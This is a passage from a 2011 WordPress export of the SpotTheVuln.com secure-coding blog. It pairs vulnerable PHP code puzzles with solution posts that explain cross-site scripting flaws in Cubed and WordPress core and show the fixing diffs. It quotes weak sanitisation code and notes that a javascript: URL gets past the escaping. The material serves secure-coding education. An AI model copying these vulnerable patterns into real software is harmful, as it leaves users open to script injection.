		$strData = str_replace(&quot;\r&quot;, &quot;\\r&quot;, $strData);
		$strData = str_replace(&quot;\&quot;&quot;, &quot;&amp;quot;&quot;, $strData);
		$strData = str_replace(&quot;&lt;/script&gt;&quot;, &quot;&amp;lt/script&amp;gt&quot;, $strData);
		$strData = str_replace(&quot;&lt;/Script&gt;&quot;, &quot;&amp;lt/script&amp;gt&quot;, $strData);
		$strData = str_replace(&quot;&lt;/SCRIPT&gt;&quot;, &quot;&amp;lt/script&amp;gt&quot;, $strData);
		return $strData;
	}
?&gt;
[/sourcecode] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1416</wp:post_id>
		<wp:post_date>2011-04-11 05:30:10</wp:post_date>
		<wp:post_date_gmt>2011-04-11 12:30:10</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>fall</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>1927</wp:comment_id>
			<wp:comment_author><![CDATA[Cross-Site Scripting (XSS), Cubed, PHP, Solution Vulnerability Code Example &laquo;SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2011/04/fall-cross-site-scripting-xss/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2011-04-15 05:36:19</wp:comment_date>
			<wp:comment_date_gmt>2011-04-15 12:36:19</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Original Code: Found Here [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1303109886.6267";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1302870979.5453";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
	</item>
	<item>
		<title>Fall - Cross Site Scripting (XSS)</title>
		<link>http://spotthevuln.com/2011/04/fall-cross-site-scripting-xss/</link>
		<pubDate>Fri, 15 Apr 2011 12:30:58 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1420</guid>
		<description></description>
		<content:encoded><![CDATA[<h1>Details</h1>
Affected Software: Cubed

Fixed in Version: 1.0 RC2

Issue Type: Cross Site Scripting

Original Code: <a href="http://spotthevuln.com/2011/04/Fall/">Found Here</a>
<h1>Details</h1>
This week’s patch is a good one.  The code sample was basically a library that only contained functions.  While there isn’t a blatant vulnerability in the library, there is a startling function called “PrepDataForScript”.   Looking at PrepDataForScript, it’s obvious this function is meant to provide some sanitization.  Unfortunately, the routine isn’t very robust.  When you see things like the code snippet below, you know the developer is headed in the wrong direction:

$strData = str_replace("</script>", "&lt/script&gt", $strData);

Fortunately, the Cubed developers were smart enough to realize that this function is dangerous and will probably lead to a false sense of security.  Instead of trying to fix it up, they just removed the function entirely.  

<h1>Developers Solution</h1>
[sourcecode language="diff" highlight="94,95,96,97,98,99,100,101,102,103"]
&lt;?php
...snip...

	function QcodoHandleError($__exc_errno, $__exc_errstr, $__exc_errfile, $__exc_errline, $blnExit = true) {
		// If a command is called with &quot;@&quot;, then we should return
		if (error_reporting() == 0)
			return;

		if (class_exists('QApplicationBase'))
			QApplicationBase::$ErrorFlag = true;

		global $__exc_strType;
		if (isset($__exc_strType))
			return;

		$__exc_strType = &quot;Error&quot;;
		$__exc_strMessage = $__exc_errstr;

		switch ($__exc_errno) {
			case E_ERROR:
				$__exc_strObjectType = &quot;E_ERROR&quot;;
				break;
			case E_WARNING:
				$__exc_strObjectType = &quot;E_WARNING&quot;;
				break;
			case E_PARSE:
				$__exc_strObjectType = &quot;E_PARSE&quot;;
				break;
			case E_NOTICE:
				$__exc_strObjectType = &quot;E_NOTICE&quot;;
				break;
			case E_STRICT:
				$__exc_strObjectType = &quot;E_STRICT&quot;;
				break;
			case E_CORE_ERROR:
				$__exc_strObjectType = &quot;E_CORE_ERROR&quot;;
				break;
			case E_CORE_WARNING:
				$__exc_strObjectType = &quot;E_CORE_WARNING&quot;;
				break;
			case E_COMPILE_ERROR:
				$__exc_strObjectType = &quot;E_COMPILE_ERROR&quot;;
				break;
			case E_COMPILE_WARNING:
				$__exc_strObjectType = &quot;E_COMPILE_WARNING&quot;;
				break;
			case E_USER_ERROR:
				$__exc_strObjectType = &quot;E_USER_ERROR&quot;;
				break;
			case E_USER_WARNING:
				$__exc_strObjectType = &quot;E_USER_WARNING&quot;;
				break;
			case E_USER_NOTICE:
				$__exc_strObjectType = &quot;E_USER_NOTICE&quot;;
				break;
			default:
				$__exc_strObjectType = &quot;Unknown&quot;;
				break;
		}

		$__exc_strFilename = $__exc_errfile;
		$__exc_intLineNumber = $__exc_errline;
		$__exc_strStackTrace = &quot;&quot;;
		$__exc_objBacktrace = debug_backtrace();
		for ($__exc_intIndex = 0; $__exc_intIndex &lt; count($__exc_objBacktrace); $__exc_intIndex++) {
			$__exc_objItem = $__exc_objBacktrace[$__exc_intIndex];
			
			$__exc_strKeyFile = (array_key_exists(&quot;file&quot;, $__exc_objItem)) ? $__exc_objItem[&quot;file&quot;] : &quot;&quot;;
			$__exc_strKeyLine = (array_key_exists(&quot;line&quot;, $__exc_objItem)) ? $__exc_objItem[&quot;line&quot;] : &quot;&quot;;
			$__exc_strKeyClass = (array_key_exists(&quot;class&quot;, $__exc_objItem)) ? $__exc_objItem[&quot;class&quot;] : &quot;&quot;;
			$__exc_strKeyType = (array_key_exists(&quot;type&quot;, $__exc_objItem)) ? $__exc_objItem[&quot;type&quot;] : &quot;&quot;;
			$__exc_strKeyFunction = (array_key_exists(&quot;function&quot;, $__exc_objItem)) ? $__exc_objItem[&quot;function&quot;] : &quot;&quot;;
			
			$__exc_strStackTrace .= sprintf(&quot;#%s %s(%s): %s%s%s()\n&quot;,
				$__exc_intIndex,
				$__exc_strKeyFile,
				$__exc_strKeyLine,
				$__exc_strKeyClass,
				$__exc_strKeyType,
				$__exc_strKeyFunction);
		}

		if (ob_get_length()) {
			$__exc_strRenderedPage = ob_get_contents();
			ob_clean();
		}

		// Call to display the Error Page (as defined in configuration.inc.php)
		require(__DOCROOT__ . ERROR_PAGE_PATH);
		if($blnExit)
			exit;
	}

-	function PrepDataForScript($strData) {
-		$strData = str_replace(&quot;\\&quot;, &quot;\\\\&quot;, $strData);
-		$strData = str_replace(&quot;\n&quot;, &quot;\\n&quot;, $strData);
-		$strData = str_replace(&quot;\r&quot;, &quot;\\r&quot;, $strData);
-		$strData = str_replace(&quot;\&quot;&quot;, &quot;&amp;quot;&quot;, $strData);
-		$strData = str_replace(&quot;&lt;/script&gt;&quot;, &quot;&amp;lt/script&amp;gt&quot;, $strData);
-		$strData = str_replace(&quot;&lt;/Script&gt;&quot;, &quot;&amp;lt/script&amp;gt&quot;, $strData);
-		$strData = str_replace(&quot;&lt;/SCRIPT&gt;&quot;, &quot;&amp;lt/script&amp;gt&quot;, $strData);
-		return $strData;
-	}
?&gt;
[/sourcecode] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1420</wp:post_id>
		<wp:post_date>2011-04-15 05:30:58</wp:post_date>
		<wp:post_date_gmt>2011-04-15 12:30:58</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>fall-cross-site-scripting-xss</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="category" nicename="cubed"><![CDATA[Cubed]]></category>
		<category domain="post_tag" nicename="false-sense-of-security"><![CDATA[false sense of security]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="sanitization"><![CDATA[sanitization]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Assassins</title>
		<link>http://spotthevuln.com/2011/04/assassins/</link>
		<pubDate>Mon, 18 Apr 2011 12:30:34 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1425</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>I do not like assassins, or men of low character.
Gene Hackman</strong></blockquote>
[sourcecode language="php"]
&lt;?php
...snip...
function wp_original_referer_field() {
	echo '&lt;input type=&quot;hidden&quot; name=&quot;_wp_original_http_referer&quot; value=&quot;' . attribute_escape(stripslashes($_SERVER['REQUEST_URI'])) . '&quot; /&gt;';
}

function wp_get_referer() {
	foreach ( array($_REQUEST['_wp_http_referer'], $_SERVER['HTTP_REFERER']) as $ref )
		if ( !empty($ref) )
			return $ref;
	return false;
}

function wp_get_original_referer() {
	if ( !empty($_REQUEST['_wp_original_http_referer']) )
		return $_REQUEST['_wp_original_http_referer'];
	return false;
}

function wp_mkdir_p($target) {
	// from php.net/mkdir user contributed notes
	if (file_exists($target)) {
		if (! @ is_dir($target))
			return false;
		else
			return true;
	}

	// Attempting to create the directory may clutter up our display.
	if (@ mkdir($target)) {
		$stat = @ stat(dirname($target));
		$dir_perms = $stat['mode'] &amp; 0007777;  // Get the permission bits.
		@ chmod($target, $dir_perms);
		return true;
	} else {
		if ( is_dir(dirname($target)) )
			return false;
	}

	// If the above failed, attempt to create the parent node, then try again.
	if (wp_mkdir_p(dirname($target)))
		return wp_mkdir_p($target);

	return false;
}

...snip...

function wp_nonce_ays($action) {
	global $pagenow, $menu, $submenu, $parent_file, $submenu_file;

	$adminurl = get_option('siteurl') . '/wp-admin';
	if ( wp_get_referer() )
		$adminurl = wp_get_referer();

	$title = __('WordPress Confirmation');
	// Remove extra layer of slashes.
	$_POST   = stripslashes_deep($_POST  );
	if ( $_POST ) {
		$q = http_build_query($_POST);
		$q = explode( ini_get('arg_separator.output'), $q);
		$html .= &quot;\t&lt;form method='post' action='$pagenow'&gt;\n&quot;;
		foreach ( (array) $q as $a ) {
			$v = substr(strstr($a, '='), 1);
			$k = substr($a, 0, -(strlen($v)+1));
			$html .= &quot;\t\t&lt;input type='hidden' name='&quot; . attribute_escape(urldecode($k)) . &quot;' value='&quot; . attribute_escape(urldecode($v)) . &quot;' /&gt;\n&quot;;
		}
		$html .= &quot;\t\t&lt;input type='hidden' name='_wpnonce' value='&quot; . wp_create_nonce($action) . &quot;' /&gt;\n&quot;;
		$html .= &quot;\t\t&lt;div id='message' class='confirm fade'&gt;\n\t\t&lt;p&gt;&quot; . wp_specialchars(wp_explain_nonce($action)) . &quot;&lt;/p&gt;\n\t\t&lt;p&gt;&lt;a href='$adminurl'&gt;&quot; . __('No') . &quot;&lt;/a&gt; &lt;input type='submit' value='&quot; . __('Yes') . &quot;' /&gt;&lt;/p&gt;\n\t\t&lt;/div&gt;\n\t&lt;/form&gt;\n&quot;;
	} else {
		$html .= &quot;\t&lt;div id='message' class='confirm fade'&gt;\n\t&lt;p&gt;&quot; . wp_specialchars(wp_explain_nonce($action)) . &quot;&lt;/p&gt;\n\t&lt;p&gt;&lt;a href='$adminurl'&gt;&quot; . __('No') . &quot;&lt;/a&gt; &lt;a href='&quot; . add_query_arg( '_wpnonce', wp_create_nonce($action), $_SERVER['REQUEST_URI'] ) . &quot;'&gt;&quot; . __('Yes') . &quot;&lt;/a&gt;&lt;/p&gt;\n\t&lt;/div&gt;\n&quot;;
	}
	$html .= &quot;&lt;/body&gt;\n&lt;/html&gt;&quot;;
	wp_die($html, $title);
}

function wp_die($message, $title = '') {
	global $wp_locale;

	header('Content-Type: text/html; charset=utf-8');

	if ( empty($title) )
		$title = __('WordPress &amp;rsaquo; Error');

	if ( strstr($_SERVER['PHP_SELF'], 'wp-admin') )
		$admin_dir = '';
	else
		$admin_dir = 'wp-admin/';

?&gt;
&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;
&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot; &lt;?php if ( function_exists('language_attributes') ) language_attributes(); ?&gt;&gt;
&lt;head&gt;
	&lt;title&gt;&lt;?php echo $title ?&gt;&lt;/title&gt;
	&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
	&lt;link rel=&quot;stylesheet&quot; href=&quot;&lt;?php echo $admin_dir; ?&gt;install.css&quot; type=&quot;text/css&quot; /&gt;
&lt;?php if ( ('rtl' == $wp_locale-&gt;text_direction) ) : ?&gt;
	&lt;link rel=&quot;stylesheet&quot; href=&quot;&lt;?php echo $admin_dir; ?&gt;install-rtl.css&quot; type=&quot;text/css&quot; /&gt;
&lt;?php endif; ?&gt;
&lt;/head&gt;
&lt;body&gt;
	&lt;h1 id=&quot;logo&quot;&gt;&lt;img alt=&quot;WordPress&quot; src=&quot;&lt;?php echo $admin_dir; ?&gt;images/wordpress-logo.png&quot; /&gt;&lt;/h1&gt;
	&lt;p&gt;&lt;?php echo $message; ?&gt;&lt;/p&gt;
&lt;/body&gt;
&lt;/html&gt;

...snip...
[/sourcecode] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1425</wp:post_id>
		<wp:post_date>2011-04-18 05:30:34</wp:post_date>
		<wp:post_date_gmt>2011-04-18 12:30:34</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>assassins</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>1972</wp:comment_id>
			<wp:comment_author><![CDATA[Cross-Site Scripting (XSS), PHP, Solution, Wordpress Vulnerability Code Example &laquo;SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2011/04/assassins-cross-site-scripting/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2011-04-22 05:32:26</wp:comment_date>
			<wp:comment_date_gmt>2011-04-22 12:32:26</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Assassins [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1303663497.1169";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1303475546.6648";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
	</item>
	<item>
		<title>Assassins - Cross Site Scripting</title>
		<link>http://spotthevuln.com/2011/04/assassins-cross-site-scripting/</link>
		<pubDate>Fri, 22 Apr 2011 12:30:27 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1428</guid>
		<description></description>
		<content:encoded><![CDATA[<h1>Details</h1>
Affected Software: WordPress Core

Fixed in Version: 2.2-alpha

Issue Type: Cross Site Scripting

Original Code: <a href="http://spotthevuln.com/2011/04/assassins/">Found Here</a>
<h1>Details</h1>
A couple of bugs affecting Wordpress core here.  On line 73, we see that $_SERVER['REQUEST_URI'] is passed to add_query_arg().  From the provided code sample, it's difficult to see that this results in XSS.  The developers addressed this by encoding the return value from  add_query_arg().

The second issue starts at wp_get_referer().  This function checks $_REQUEST['_wp_http_referer'] and/or $_SERVER['HTTP_REFERER'] for possible values.  This makes is so the attacker has several options for tainting wp_get_referer().  Passing a tainted GET or POST parameter will do the trick.  Simply redirecting to the vulnerable Wordpress installation from a tainted URL will also taint the value returned from wp_get_referer().
Later, in wp_nonce_ays(), the tainted wp_get_referer() value is passed to the $adminurl variable.  $adminurl is then used to build HTML markup in a couple of different places.  The WP developers addressed this issue by passing wp_get_referer() before assinging that value to $adminurl.  Seems like an effective fix?

Well, url values are always a bit tricky.  These values have to be encoded before being used to build HTML markup.  URLs also have to be validated if they are being passed to a SRC, HREF, or other HTML attribute which causes a browser navigation or request.  In this example, the tainted $adminurl is used to populate an A HREF value.  The value is encoded, however that encoding doesn't stop an attacker from passing a javascript:payload url... 

<h1>Developers Solution</h1>
[sourcecode language="diff" highlight="9,55,56,73,74"]
&lt;?php

...snip...
function wp_original_referer_field() {
	echo '&lt;input type=&quot;hidden&quot; name=&quot;_wp_original_http_referer&quot; value=&quot;' . attribute_escape(stripslashes($_SERVER['REQUEST_URI'])) . '&quot; /&gt;';
}

function wp_get_referer() {
	foreach ( array($_REQUEST['_wp_http_referer'], $_SERVER['HTTP_REFERER']) as $ref )
		if ( !empty($ref) )
			return $ref;
	return false;
}

function wp_get_original_referer() {
	if ( !empty($_REQUEST['_wp_original_http_referer']) )
		return $_REQUEST['_wp_original_http_referer'];
	return false;
}

function wp_mkdir_p($target) {
	// from php.net/mkdir user contributed notes
	if (file_exists($target)) {
		if (! @ is_dir($target))
			return false;
		else
			return true;
	}

	// Attempting to create the directory may clutter up our display.
	if (@ mkdir($target)) {
		$stat = @ stat(dirname($target));
		$dir_perms = $stat['mode'] &amp; 0007777;  // Get the permission bits.
		@ chmod($target, $dir_perms);
		return true;
	} else {
		if ( is_dir(dirname($target)) )
			return false;
	}

	// If the above failed, attempt to create the parent node, then try again.
	if (wp_mkdir_p(dirname($target)))
		return wp_mkdir_p($target);

	return false;
}

...snip...

function wp_nonce_ays($action) {
	global $pagenow, $menu, $submenu, $parent_file, $submenu_file;

	$adminurl = get_option('siteurl') . '/wp-admin';
	if ( wp_get_referer() )
-		$adminurl = wp_get_referer();
+		$adminurl = attribute_escape(wp_get_referer());

	$title = __('WordPress Confirmation');
	// Remove extra layer of slashes.
	$_POST   = stripslashes_deep($_POST  );
	if ( $_POST ) {
		$q = http_build_query($_POST);
		$q = explode( ini_get('arg_separator.output'), $q);
		$html .= &quot;\t&lt;form method='post' action='$pagenow'&gt;\n&quot;;
		foreach ( (array) $q as $a ) {
			$v = substr(strstr($a, '='), 1);
			$k = substr($a, 0, -(strlen($v)+1));
			$html .= &quot;\t\t&lt;input type='hidden' name='&quot; . attribute_escape(urldecode($k)) . &quot;' value='&quot; . attribute_escape(urldecode($v)) . &quot;' /&gt;\n&quot;;
		}
		$html .= &quot;\t\t&lt;input type='hidden' name='_wpnonce' value='&quot; . wp_create_nonce($action) . &quot;' /&gt;\n&quot;;
		$html .= &quot;\t\t&lt;div id='message' class='confirm fade'&gt;\n\t\t&lt;p&gt;&quot; . wp_specialchars(wp_explain_nonce($action)) . &quot;&lt;/p&gt;\n\t\t&lt;p&gt;&lt;a href='$adminurl'&gt;&quot; . __('No') . &quot;&lt;/a&gt; &lt;input type='submit' value='&quot; . __('Yes') . &quot;' /&gt;&lt;/p&gt;\n\t\t&lt;/div&gt;\n\t&lt;/form&gt;\n&quot;;
	} else {
-		$html .= &quot;\t&lt;div id='message' class='confirm fade'&gt;\n\t&lt;p&gt;&quot; . wp_specialchars(wp_explain_nonce($action)) . &quot;&lt;/p&gt;\n\t&lt;p&gt;&lt;a href='$adminurl'&gt;&quot; . __('No') . &quot;&lt;/a&gt; &lt;a href='&quot; . add_query_arg( '_wpnonce', wp_create_nonce($action), $_SERVER['REQUEST_URI'] ) . &quot;'&gt;&quot; . __('Yes') . &quot;&lt;/a&gt;&lt;/p&gt;\n\t&lt;/div&gt;\n&quot;;
+       $html .= &quot;\t&lt;div id='message' class='confirm fade'&gt;\n\t&lt;p&gt;&quot; . wp_specialchars(wp_explain_nonce($action)) . &quot;&lt;/p&gt;\n\t&lt;p&gt;&lt;a href='$adminurl'&gt;&quot; . __('No') . &quot;&lt;/a&gt; &lt;a href='&quot; . attribute_escape(add_query_arg( '_wpnonce', wp_create_nonce($action), $_SERVER['REQUEST_URI'] )) . &quot;'&gt;&quot; . __('Yes') . &quot;&lt;/a&gt;&lt;/p&gt;\n\t&lt;/div&gt;\n&quot;; 
	}
	$html .= &quot;&lt;/body&gt;\n&lt;/html&gt;&quot;;
	wp_die($html, $title);
}

function wp_die($message, $title = '') {
	global $wp_locale;

	header('Content-Type: text/html; charset=utf-8');

	if ( empty($title) )
		$title = __('WordPress &amp;rsaquo; Error');

	if ( strstr($_SERVER['PHP_SELF'], 'wp-admin') )
		$admin_dir = '';
	else
		$admin_dir = 'wp-admin/';

?&gt;
&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;
&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot; &lt;?php if ( function_exists('language_attributes') ) language_attributes(); ?&gt;&gt;
&lt;head&gt;
	&lt;title&gt;&lt;?php echo $title ?&gt;&lt;/title&gt;
	&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
	&lt;link rel=&quot;stylesheet&quot; href=&quot;&lt;?php echo $admin_dir; ?&gt;install.css&quot; type=&quot;text/css&quot; /&gt;
&lt;?php if ( ('rtl' == $wp_locale-&gt;text_direction) ) : ?&gt;
	&lt;link rel=&quot;stylesheet&quot; href=&quot;&lt;?php echo $admin_dir; ?&gt;install-rtl.css&quot; type=&quot;text/css&quot; /&gt;
&lt;?php endif; ?&gt;
&lt;/head&gt;
&lt;body&gt;
	&lt;h1 id=&quot;logo&quot;&gt;&lt;img alt=&quot;WordPress&quot; src=&quot;&lt;?php echo $admin_dir; ?&gt;images/wordpress-logo.png&quot; /&gt;&lt;/h1&gt;
	&lt;p&gt;&lt;?php echo $message; ?&gt;&lt;/p&gt;
&lt;/body&gt;
&lt;/html&gt;

...snip...
[/sourcecode] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1428</wp:post_id>
		<wp:post_date>2011-04-22 05:30:27</wp:post_date>
		<wp:post_date_gmt>2011-04-22 12:30:27</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>assassins-cross-site-scripting</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="referer-field"><![CDATA[referer field]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<category domain="category" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<category domain="post_tag" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Bases</title>
		<link>http://spotthevuln.com/2011/04/bases/</link>
		<pubDate>Mon, 25 Apr 2011 12:30:16 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1433</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>I have only one superstition. Touch all the bases when I hit a home run.
Babe Ruth</strong></blockquote>
[sourcecode language="php"]
&lt;?php
ob_start();
/*
array( floor($code / 100)
 1=&gt;'INFO', 2=&gt;'SUCCESS', 3=&gt;'REDIRECT', 4|5=&gt;'ERROR', 4=&gt;'CLIENT_ERROR', 5=&gt;'SERVER_ERROR', 'VALID_RESPONSE');
*/
$http_status_codes=array(
        100 =&gt; 'Continue',
        101 =&gt; 'Switching Protocols',
        102 =&gt; 'Processing',
        200 =&gt; 'OK',
        201 =&gt; 'Created',
        202 =&gt; 'Accepted',
        203 =&gt; 'Non-Authoritative Information',
        204 =&gt; 'No Content',
        205 =&gt; 'Reset Content',
        206 =&gt; 'Partial Content',
        207 =&gt; 'Multi-Status',
        300 =&gt; 'Multiple Choices',
        301 =&gt; 'Moved Permanently',
        302 =&gt; 'Found',
        303 =&gt; 'See Other',
        304 =&gt; 'Not Modified',
        305 =&gt; 'Use Proxy',
        306 =&gt; 'unused',
        307 =&gt; 'Temporary Redirect',
